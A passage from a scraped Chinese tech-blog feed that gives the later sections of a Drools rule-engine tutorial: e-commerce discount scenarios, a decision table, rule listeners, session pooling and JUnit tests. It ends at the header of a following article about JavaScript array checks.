        <span class="hljs-comment">// 创建订单副本用于预览</span>
        <span class="hljs-type">Order</span> <span class="hljs-variable">previewOrder</span> <span class="hljs-operator">=</span> cloneOrder(order);
        <span class="hljs-keyword">return</span> ruleService.applyDiscountRules(previewOrder);
    }

    <span class="hljs-keyword">private</span> Order <span class="hljs-title function_">cloneOrder</span><span class="hljs-params">(Order order)</span> {
        <span class="hljs-type">Order</span> <span class="hljs-variable">clone</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Order</span>();
        clone.setOrderId(order.getOrderId());
        clone.setCustomer(order.getCustomer());
        clone.setItems(order.getItems());
        clone.setTotalAmount(order.getTotalAmount());
        clone.setFinalAmount(order.getTotalAmount());
        clone.setPromotionCode(order.getPromotionCode());
        <span class="hljs-keyword">return</span> clone;
    }
}
</code></pre>
<h3 data-id="heading-22">七、实际应用场景</h3>
<h4 data-id="heading-23">7.1 电商促销系统</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.drools.scenario;

<span class="hljs-keyword">import</span> com.example.drools.model.*;
<span class="hljs-keyword">import</span> com.example.drools.service.OrderService;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Component;

<span class="hljs-keyword">import</span> java.math.BigDecimal;
<span class="hljs-keyword">import</span> java.time.LocalDate;
<span class="hljs-keyword">import</span> java.util.Arrays;
<span class="hljs-keyword">import</span> java.util.List;

<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EcommerceScenario</span> {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> OrderService orderService;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">EcommerceScenario</span><span class="hljs-params">(OrderService orderService)</span> {
        <span class="hljs-built_in">this</span>.orderService = orderService;
    }

    <span class="hljs-comment">/**
     * 场景1: VIP客户购买电子产品
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">vipCustomerPurchase</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 创建VIP客户</span>
        <span class="hljs-type">Customer</span> <span class="hljs-variable">vipCustomer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Customer</span>(
                <span class="hljs-number">1L</span>,
                <span class="hljs-string">"张三"</span>,
                <span class="hljs-string">"VIP"</span>,
                <span class="hljs-number">5000</span>,
                LocalDate.of(<span class="hljs-number">2020</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>),
                <span class="hljs-literal">false</span>
        );

        <span class="hljs-comment">// 创建商品</span>
        <span class="hljs-type">Product</span> <span class="hljs-variable">laptop</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Product</span>(
                <span class="hljs-number">101L</span>,
                <span class="hljs-string">"笔记本电脑"</span>,
                <span class="hljs-string">"ELECTRONICS"</span>,
                <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigDecimal</span>(<span class="hljs-string">"5999"</span>),
                <span class="hljs-literal">true</span>,
                <span class="hljs-number">50</span>
        );

        <span class="hljs-type">Product</span> <span class="hljs-variable">mouse</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Product</span>(
                <span class="hljs-number">102L</span>,
                <span class="hljs-string">"无线鼠标"</span>,
                <span class="hljs-string">"ELECTRONICS"</span>,
                <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigDecimal</span>(<span class="hljs-string">"199"</span>),
                <span class="hljs-literal">true</span>,
                <span class="hljs-number">100</span>
        );

        <span class="hljs-comment">// 创建订单项</span>
        <span class="hljs-type">OrderItem</span> <span class="hljs-variable">item1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OrderItem</span>(laptop, <span class="hljs-number">1</span>, laptop.getPrice(), BigDecimal.ZERO);
        <span class="hljs-type">OrderItem</span> <span class="hljs-variable">item2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OrderItem</span>(mouse, <span class="hljs-number">2</span>, mouse.getPrice(), BigDecimal.ZERO);

        List&lt;OrderItem&gt; items = Arrays.asList(item1, item2);

        <span class="hljs-comment">// 处理订单</span>
        <span class="hljs-type">Order</span> <span class="hljs-variable">order</span> <span class="hljs-operator">=</span> orderService.createOrder(vipCustomer, items, <span class="hljs-literal">null</span>);

        printOrderSummary(order);
    }

    <span class="hljs-comment">/**
     * 场景2: 新客户首单
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">newCustomerFirstOrder</span><span class="hljs-params">()</span> {
        <span class="hljs-type">Customer</span> <span class="hljs-variable">newCustomer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Customer</span>(
                <span class="hljs-number">2L</span>,
                <span class="hljs-string">"李四"</span>,
                <span class="hljs-string">"NORMAL"</span>,
                <span class="hljs-number">0</span>,
                LocalDate.now(),
                <span class="hljs-literal">true</span>
        );

        <span class="hljs-type">Product</span> <span class="hljs-variable">book</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Product</span>(
                <span class="hljs-number">201L</span>,
                <span class="hljs-string">"Java编程思想"</span>,
                <span class="hljs-string">"BOOKS"</span>,
                <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigDecimal</span>(<span class="hljs-string">"89"</span>),
                <span class="hljs-literal">false</span>,
                <span class="hljs-number">200</span>
        );

        <span class="hljs-type">OrderItem</span> <span class="hljs-variable">item</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OrderItem</span>(book, <span class="hljs-number">3</span>, book.getPrice(), BigDecimal.ZERO);

        <span class="hljs-type">Order</span> <span class="hljs-variable">order</span> <span class="hljs-operator">=</span> orderService.createOrder(newCustomer, Arrays.asList(item), <span class="hljs-literal">null</span>);

        printOrderSummary(order);
    }

    <span class="hljs-comment">/**
     * 场景3: 促销码+大额订单
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">promotionCodePurchase</span><span class="hljs-params">()</span> {
        <span class="hljs-type">Customer</span> <span class="hljs-variable">goldCustomer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Customer</span>(
                <span class="hljs-number">3L</span>,
                <span class="hljs-string">"王五"</span>,
                <span class="hljs-string">"GOLD"</span>,
                <span class="hljs-number">2000</span>,
                LocalDate.of(<span class="hljs-number">2022</span>, <span class="hljs-number">6</span>, <span class="hljs-number">1</span>),
                <span class="hljs-literal">false</span>
        );

        <span class="hljs-type">Product</span> <span class="hljs-variable">phone</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Product</span>(
                <span class="hljs-number">301L</span>,
                <span class="hljs-string">"智能手机"</span>,
                <span class="hljs-string">"ELECTRONICS"</span>,
                <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigDecimal</span>(<span class="hljs-string">"3999"</span>),
                <span class="hljs-literal">true</span>,
                <span class="hljs-number">30</span>
        );

        <span class="hljs-type">OrderItem</span> <span class="hljs-variable">item</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OrderItem</span>(phone, <span class="hljs-number">1</span>, phone.getPrice(), BigDecimal.ZERO);

        <span class="hljs-type">Order</span> <span class="hljs-variable">order</span> <span class="hljs-operator">=</span> orderService.createOrder(
                goldCustomer,
                Arrays.asList(item),
                <span class="hljs-string">"SAVE20"</span>
        );

        printOrderSummary(order);
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">printOrderSummary</span><span class="hljs-params">(Order order)</span> {
        System.out.println(<span class="hljs-string">"\n========== 订单摘要 =========="</span>);
        System.out.println(<span class="hljs-string">"订单ID: "</span> + order.getOrderId());
        System.out.println(<span class="hljs-string">"客户: "</span> + order.getCustomer().getName() +
                         <span class="hljs-string">" ("</span> + order.getCustomer().getLevel() + <span class="hljs-string">")"</span>);
        System.out.println(<span class="hljs-string">"商品数量: "</span> + order.getItemCount());
        System.out.println(<span class="hljs-string">"原始金额: ¥"</span> + order.getTotalAmount());
        System.out.println(<span class="hljs-string">"优惠金额: ¥"</span> + order.getDiscountAmount());
        System.out.println(<span class="hljs-string">"最终金额: ¥"</span> + order.getFinalAmount());
        System.out.println(<span class="hljs-string">"状态: "</span> + order.getStatus());
        System.out.println(<span class="hljs-string">"=============================\n"</span>);
    }
}
</code></pre>
<h4 data-id="heading-24">7.2 规则执行流程</h4>
<pre><code class="hljs language-lua" lang="lua">订单处理流程:

+<span class="hljs-comment">------------------+</span>
|   创建订单对象    |
+<span class="hljs-comment">--------+---------+</span>
         |
         v
+<span class="hljs-comment">--------+---------+</span>
|   计算商品小计    |
+<span class="hljs-comment">--------+---------+</span>
         |
         v
+<span class="hljs-comment">--------+---------+</span>
|   计算订单总额    |
+<span class="hljs-comment">--------+---------+</span>
         |
         v
+<span class="hljs-comment">--------+---------+</span>
|   订单验证规则    |
|   - 库存检查     |
|   - 金额检查     |
|   - 权限检查     |
+<span class="hljs-comment">--------+---------+</span>
         |
    +<span class="hljs-comment">----+----+</span>
    |         |
   YES       NO
    |         |
    v         v
+<span class="hljs-comment">---+----+ +--+------------+</span>
|折扣规则 | | 返回验证错误  |
|执行    | +<span class="hljs-comment">--------------+</span>
+<span class="hljs-comment">---+----+</span>
    |
    v
+<span class="hljs-comment">---+------------+</span>
| 按优先级执行:   |
| <span class="hljs-number">1.</span> VIP折扣     |
| <span class="hljs-number">2.</span> 会员折扣     |
| <span class="hljs-number">3.</span> 大额折扣     |
| <span class="hljs-number">4.</span> 促销折扣     |
+<span class="hljs-comment">---+------------+</span>
    |
    v
+<span class="hljs-comment">---+------------+</span>
| 计算最终金额    |
+<span class="hljs-comment">---+------------+</span>
    |
    v
+<span class="hljs-comment">---+------------+</span>
| 返回订单结果    |
+<span class="hljs-comment">----------------+</span>
</code></pre>
<h3 data-id="heading-25">八、Decision Table决策表</h3>
<h4 data-id="heading-26">8.1 Excel决策表</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 决策表结构 (在Excel中)</span>
<span class="hljs-comment">/*
RuleTable DiscountDecisionTable

CONDITION                    CONDITION           CONDITION       ACTION
客户等级                      订单金额            商品数量         折扣率
customer.level              totalAmount         itemCount       discountRate

VIP                         &gt;1000               &gt;5              0.20
VIP                         &gt;500                &gt;0              0.15
GOLD                        &gt;1000               &gt;5              0.15
GOLD                        &gt;500                &gt;0              0.10
SILVER                      &gt;1000               &gt;10             0.10
SILVER                      &gt;500                &gt;0              0.08
NORMAL                      &gt;2000               &gt;20             0.08
NORMAL                      &gt;1000               &gt;10             0.05
*/</span>
</code></pre>
<h4 data-id="heading-27">8.2 加载Decision Table</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.drools.config;

<span class="hljs-keyword">import</span> org.drools.decisiontable.InputType;
<span class="hljs-keyword">import</span> org.drools.decisiontable.SpreadsheetCompiler;
<span class="hljs-keyword">import</span> org.kie.api.KieServices;
<span class="hljs-keyword">import</span> org.kie.api.builder.KieBuilder;
<span class="hljs-keyword">import</span> org.kie.api.builder.KieFileSystem;
<span class="hljs-keyword">import</span> org.kie.api.builder.KieModule;
<span class="hljs-keyword">import</span> org.kie.api.io.ResourceType;
<span class="hljs-keyword">import</span> org.kie.api.runtime.KieContainer;
<span class="hljs-keyword">import</span> org.kie.internal.io.ResourceFactory;
<span class="hljs-keyword">import</span> org.springframework.context.annotation.Bean;
<span class="hljs-keyword">import</span> org.springframework.context.annotation.Configuration;

<span class="hljs-keyword">import</span> java.io.InputStream;

<span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DecisionTableConfig</span> {

    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> KieContainer <span class="hljs-title function_">decisionTableContainer</span><span class="hljs-params">()</span> {
        <span class="hljs-type">KieServices</span> <span class="hljs-variable">kieServices</span> <span class="hljs-operator">=</span> KieServices.Factory.get();
        <span class="hljs-type">KieFileSystem</span> <span class="hljs-variable">kieFileSystem</span> <span class="hljs-operator">=</span> kieServices.newKieFileSystem();

        <span class="hljs-comment">// 编译Excel决策表</span>
        <span class="hljs-type">InputStream</span> <span class="hljs-variable">template</span> <span class="hljs-operator">=</span> getClass()
                .getResourceAsStream(<span class="hljs-string">"/decision-tables/discount-table.xls"</span>);

        <span class="hljs-type">SpreadsheetCompiler</span> <span class="hljs-variable">compiler</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SpreadsheetCompiler</span>();
        <span class="hljs-type">String</span> <span class="hljs-variable">drl</span> <span class="hljs-operator">=</span> compiler.compile(template, InputType.XLS);

        kieFileSystem.write(<span class="hljs-string">"src/main/resources/discount-table.drl"</span>, drl);

        <span class="hljs-type">KieBuilder</span> <span class="hljs-variable">kieBuilder</span> <span class="hljs-operator">=</span> kieServices.newKieBuilder(kieFileSystem);
        kieBuilder.buildAll();

        <span class="hljs-type">KieModule</span> <span class="hljs-variable">kieModule</span> <span class="hljs-operator">=</span> kieBuilder.getKieModule();
        <span class="hljs-keyword">return</span> kieServices.newKieContainer(kieModule.getReleaseId());
    }
}
</code></pre>
<h3 data-id="heading-28">九、监控与调试</h3>
<h4 data-id="heading-29">9.1 规则执行监听器</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.drools.listener;

<span class="hljs-keyword">import</span> lombok.extern.slf4j.Slf4j;
<span class="hljs-keyword">import</span> org.kie.api.event.rule.*;

<span class="hljs-meta">@Slf4j</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RuleExecutionListener</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">DefaultAgendaEventListener</span> {

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">beforeMatchFired</span><span class="hljs-params">(BeforeMatchFiredEvent event)</span> {
        <span class="hljs-type">String</span> <span class="hljs-variable">ruleName</span> <span class="hljs-operator">=</span> event.getMatch().getRule().getName();
        log.info(<span class="hljs-string">"准备执行规则: {}"</span>, ruleName);
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">afterMatchFired</span><span class="hljs-params">(AfterMatchFiredEvent event)</span> {
        <span class="hljs-type">String</span> <span class="hljs-variable">ruleName</span> <span class="hljs-operator">=</span> event.getMatch().getRule().getName();
        log.info(<span class="hljs-string">"规则执行完成: {}"</span>, ruleName);
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">matchCreated</span><span class="hljs-params">(MatchCreatedEvent event)</span> {
        <span class="hljs-type">String</span> <span class="hljs-variable">ruleName</span> <span class="hljs-operator">=</span> event.getMatch().getRule().getName();
        log.debug(<span class="hljs-string">"规则匹配成功: {}"</span>, ruleName);
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">matchCancelled</span><span class="hljs-params">(MatchCancelledEvent event)</span> {
        <span class="hljs-type">String</span> <span class="hljs-variable">ruleName</span> <span class="hljs-operator">=</span> event.getMatch().getRule().getName();
        log.debug(<span class="hljs-string">"规则匹配取消: {}"</span>, ruleName);
    }
}
</code></pre>
<h4 data-id="heading-30">9.2 使用监听器</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.drools.service;

<span class="hljs-keyword">import</span> com.example.drools.listener.RuleExecutionListener;
<span class="hljs-keyword">import</span> com.example.drools.model.Order;
<span class="hljs-keyword">import</span> org.kie.api.runtime.KieContainer;
<span class="hljs-keyword">import</span> org.kie.api.runtime.KieSession;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Service;

<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MonitoredRuleService</span> {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> KieContainer kieContainer;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">MonitoredRuleService</span><span class="hljs-params">(KieContainer kieContainer)</span> {
        <span class="hljs-built_in">this</span>.kieContainer = kieContainer;
    }

    <span class="hljs-keyword">public</span> Order <span class="hljs-title function_">executeWithMonitoring</span><span class="hljs-params">(Order order)</span> {
        <span class="hljs-type">KieSession</span> <span class="hljs-variable">kieSession</span> <span class="hljs-operator">=</span> kieContainer.newKieSession();

        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// 添加监听器</span>
            kieSession.addEventListener(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RuleExecutionListener</span>());

            <span class="hljs-comment">// 执行规则</span>
            kieSession.insert(order);
            kieSession.fireAllRules();

            <span class="hljs-keyword">return</span> order;
        } <span class="hljs-keyword">finally</span> {
            kieSession.dispose();
        }
    }
}
</code></pre>
<h3 data-id="heading-31">十、性能优化</h3>
<h4 data-id="heading-32">10.1 规则优化建议</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 优化前 - 性能较差</span>
rule <span class="hljs-string">"Bad Performance Rule"</span>
    when
        $order: Order()
        $customer: Customer() from $order.customer
        $item: OrderItem() from $order.items
    then
        <span class="hljs-comment">// 复杂计算</span>
end

<span class="hljs-comment">// 优化后 - 性能更好</span>
rule <span class="hljs-string">"Good Performance Rule"</span>
    salience <span class="hljs-number">100</span>
    when
        $order: Order(
            customer.level == <span class="hljs-string">"VIP"</span>,
            totalAmount &gt; <span class="hljs-number">1000</span>
        )
    then
        <span class="hljs-comment">// 简化逻辑</span>
        $order.applyDiscount($order.getTotalAmount().multiply(<span class="hljs-keyword">new</span> <span class="hljs-title class_">BigDecimal</span>(<span class="hljs-string">"0.15"</span>)));
end
</code></pre>
<h4 data-id="heading-33">10.2 KieSession管理</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.drools.service;

<span class="hljs-keyword">import</span> org.kie.api.runtime.KieContainer;
<span class="hljs-keyword">import</span> org.kie.api.runtime.KieSession;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Component;

<span class="hljs-keyword">import</span> javax.annotation.PreDestroy;
<span class="hljs-keyword">import</span> java.util.concurrent.ConcurrentLinkedQueue;

<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">KieSessionPool</span> {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> KieContainer kieContainer;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> ConcurrentLinkedQueue&lt;KieSession&gt; sessionPool;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">POOL_SIZE</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">KieSessionPool</span><span class="hljs-params">(KieContainer kieContainer)</span> {
        <span class="hljs-built_in">this</span>.kieContainer = kieContainer;
        <span class="hljs-built_in">this</span>.sessionPool = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentLinkedQueue</span>&lt;&gt;();
        initializePool();
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">initializePool</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; POOL_SIZE; i++) {
            sessionPool.offer(kieContainer.newKieSession());
        }
    }

    <span class="hljs-keyword">public</span> KieSession <span class="hljs-title function_">getSession</span><span class="hljs-params">()</span> {
        <span class="hljs-type">KieSession</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sessionPool.poll();
        <span class="hljs-keyword">if</span> (session == <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">return</span> kieContainer.newKieSession();
        }
        <span class="hljs-keyword">return</span> session;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">returnSession</span><span class="hljs-params">(KieSession session)</span> {
        <span class="hljs-keyword">if</span> (session != <span class="hljs-literal">null</span>) {
            session.dispose();
            sessionPool.offer(kieContainer.newKieSession());
        }
    }

    <span class="hljs-meta">@PreDestroy</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">cleanup</span><span class="hljs-params">()</span> {
        sessionPool.forEach(KieSession::dispose);
    }
}
</code></pre>
<h3 data-id="heading-34">十一、测试用例</h3>
<h4 data-id="heading-35">11.1 单元测试</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.drools;

<span class="hljs-keyword">import</span> com.example.drools.model.*;
<span class="hljs-keyword">import</span> com.example.drools.service.RuleService;
<span class="hljs-keyword">import</span> org.junit.jupiter.api.BeforeEach;
<span class="hljs-keyword">import</span> org.junit.jupiter.api.Test;
<span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;
<span class="hljs-keyword">import</span> org.springframework.boot.test.context.SpringBootTest;

<span class="hljs-keyword">import</span> java.math.BigDecimal;
<span class="hljs-keyword">import</span> java.time.LocalDate;
<span class="hljs-keyword">import</span> java.util.Arrays;
<span class="hljs-keyword">import</span> java.util.List;

<span class="hljs-keyword">import</span> <span class="hljs-keyword">static</span> org.junit.jupiter.api.Assertions.*;

<span class="hljs-meta">@SpringBootTest</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">DroolsRuleTest</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> RuleService ruleService;

    <span class="hljs-keyword">private</span> Order testOrder;
    <span class="hljs-keyword">private</span> Customer vipCustomer;

    <span class="hljs-meta">@BeforeEach</span>
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">setUp</span><span class="hljs-params">()</span> {
        vipCustomer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Customer</span>(
                <span class="hljs-number">1L</span>, <span class="hljs-string">"测试VIP"</span>, <span class="hljs-string">"VIP"</span>, <span class="hljs-number">5000</span>,
                LocalDate.of(<span class="hljs-number">2020</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>), <span class="hljs-literal">false</span>
        );

        <span class="hljs-type">Product</span> <span class="hljs-variable">product</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Product</span>(
                <span class="hljs-number">1L</span>, <span class="hljs-string">"测试商品"</span>, <span class="hljs-string">"ELECTRONICS"</span>,
                <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigDecimal</span>(<span class="hljs-string">"1000"</span>), <span class="hljs-literal">true</span>, <span class="hljs-number">100</span>
        );

        <span class="hljs-type">OrderItem</span> <span class="hljs-variable">item</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OrderItem</span>(
                product, <span class="hljs-number">2</span>, product.getPrice(), BigDecimal.ZERO
        );
        item.calculateSubtotal();

        testOrder = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Order</span>();
        testOrder.setOrderId(<span class="hljs-number">1L</span>);
        testOrder.setCustomer(vipCustomer);
        testOrder.setItems(Arrays.asList(item));
        testOrder.calculateTotalAmount();
        testOrder.setFinalAmount(testOrder.getTotalAmount());
    }

    <span class="hljs-meta">@Test</span>
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">testVipDiscount</span><span class="hljs-params">()</span> {
        <span class="hljs-type">Order</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> ruleService.applyDiscountRules(testOrder);

        assertTrue(result.getDiscountAmount().compareTo(BigDecimal.ZERO) &gt; <span class="hljs-number">0</span>,
                <span class="hljs-string">"VIP客户应该有折扣"</span>);
        assertTrue(result.getFinalAmount().compareTo(result.getTotalAmount()) &lt; <span class="hljs-number">0</span>,
                <span class="hljs-string">"最终金额应该小于原始金额"</span>);
    }

    <span class="hljs-meta">@Test</span>
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">testLargeOrderDiscount</span><span class="hljs-params">()</span> {
        <span class="hljs-type">Product</span> <span class="hljs-variable">expensiveProduct</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Product</span>(
                <span class="hljs-number">2L</span>, <span class="hljs-string">"昂贵商品"</span>, <span class="hljs-string">"ELECTRONICS"</span>,
                <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigDecimal</span>(<span class="hljs-string">"1500"</span>), <span class="hljs-literal">true</span>, <span class="hljs-number">50</span>
        );
        <span class="hljs-type">OrderItem</span> <span class="hljs-variable">item</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OrderItem</span>(
                expensiveProduct, <span class="hljs-number">1</span>, expensiveProduct.getPrice(), BigDecimal.ZERO
        );
        item.calculateSubtotal();

        testOrder.setItems(Arrays.asList(item));
        testOrder.calculateTotalAmount();

        <span class="hljs-type">Order</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> ruleService.applyDiscountRules(testOrder);

        assertTrue(result.getDiscountAmount().compareTo(BigDecimal.ZERO) &gt; <span class="hljs-number">0</span>,
                <span class="hljs-string">"大额订单应该有折扣"</span>);
    }

    <span class="hljs-meta">@Test</span>
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">testOrderValidation</span><span class="hljs-params">()</span> {
        <span class="hljs-type">Product</span> <span class="hljs-variable">outOfStock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Product</span>(
                <span class="hljs-number">3L</span>, <span class="hljs-string">"缺货商品"</span>, <span class="hljs-string">"ELECTRONICS"</span>,
                <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigDecimal</span>(<span class="hljs-string">"500"</span>), <span class="hljs-literal">true</span>, <span class="hljs-number">0</span>
        );
        <span class="hljs-type">OrderItem</span> <span class="hljs-variable">item</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OrderItem</span>(outOfStock, <span class="hljs-number">1</span>, outOfStock.getPrice(), BigDecimal.ZERO);

        testOrder.setItems(Arrays.asList(item));

        List&lt;String&gt; errors = ruleService.validateOrder(testOrder);

        assertFalse(errors.isEmpty(), <span class="hljs-string">"应该有验证错误"</span>);
        assertTrue(errors.stream().anyMatch(e -&gt; e.contains(<span class="hljs-string">"库存"</span>)),
                <span class="hljs-string">"应该包含库存错误"</span>);
    }
}
</code></pre>
<h3 data-id="heading-36">十二、总结</h3>
<p>本文全面介绍了Drools规则引擎的实战应用：</p>
<ol>
<li><strong>核心架构</strong>：KieBase、KieSession、Agenda工作原理</li>
<li><strong>规则编写</strong>：DRL语法、条件匹配、动作执行</li>
<li><strong>Spring集成</strong>：配置管理、依赖注入</li>
<li><strong>实战场景</strong>：电商促销、订单折扣、库存验证</li>
<li><strong>高级特性</strong>：Decision Table、规则监听、性能优化</li>
<li><strong>最佳实践</strong>：规则设计、Session管理、测试策略</li>
</ol>
<p>Drools将业务规则与代码解耦，使规则更易维护和扩展，是企业级应用的理想选择。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[数组判断？我早不用instanceof了，现在一行代码搞定！]]></title>    <link>https://juejin.cn/post/7579849892614094884</link>    <guid>https://juejin.cn/post/7579849892614094884</guid>    <pubDate>2025-12-05T03:02:33.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579849892614094884" data-draft-id="7571846248718794752" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="数组判断？我早不用instanceof了，现在一行代码搞定！"/> <meta itemprop="keywords" content="JavaScript,前端"/> <meta itemprop="datePublished" content="2025-12-05T03:02:33.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="南游"/> <meta itemprop="url" content="https://juejin.cn/user/1728872003943688"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            数组判断？我早不用instanceof了，现在一行代码搞定！
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1728872003943688/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    南游
